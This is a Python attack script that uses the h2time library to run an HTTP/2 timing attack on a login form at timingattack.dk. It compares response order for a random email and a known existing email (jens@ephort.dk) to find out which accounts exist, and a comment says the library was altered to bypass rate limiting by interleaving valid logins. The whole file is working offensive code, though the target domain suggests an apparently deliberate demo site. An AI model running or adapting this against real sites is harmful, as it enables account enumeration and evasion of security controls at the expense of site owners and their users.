from h2time import H2Time, H2Request
import asyncio
import random
import string
import os

async def attack():
    # h2time.py has been amended, so that for each 4th request a correct login+logout with a known user credential is done so that ratelimiting is bypassed.

    # This must be the email that you as the hacker want to test if exists on the site
    post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'

    # This has to be the email known by the hacker to be existing on the site. But the password must be wrong.
    post_data2 = 'password=12345789abc&email=jens@ephort.dk'
    r1 = H2Request('POST', 'https://timingattack.dk/defaultlogin/public/login', {'content-length': str(len(post_data)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data)
    r2 = H2Request('POST', 'https://timingattack.dk/defaultlogin/public/login', {'content-length': str(len(post_data2)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data2)

    num_request_pairs = 5
    safety_margin = 1
    async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10) as h2t:
        results = await h2t.run_attack()
        output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
        num = output.count('-')
        print(output)
    if ((num - (num_request_pairs/2)) > safety_margin):
        print("Request 1 is likely winner (response received last from server in %s of the request pairs)" % (num))
        print(post_data)
    elif ((num - (num_request_pairs/2)) < -safety_margin):
        print("Request 2 is likely winner (response received last from server in %s of the request pairs)" % (num_request_pairs-num))
    else:
        print("Could not determine winner. Even distributed with %s responses that came in with response 1 last" % (num))

loop = asyncio.get_event_loop()
loop.run_until_complete(attack())
loop.close()
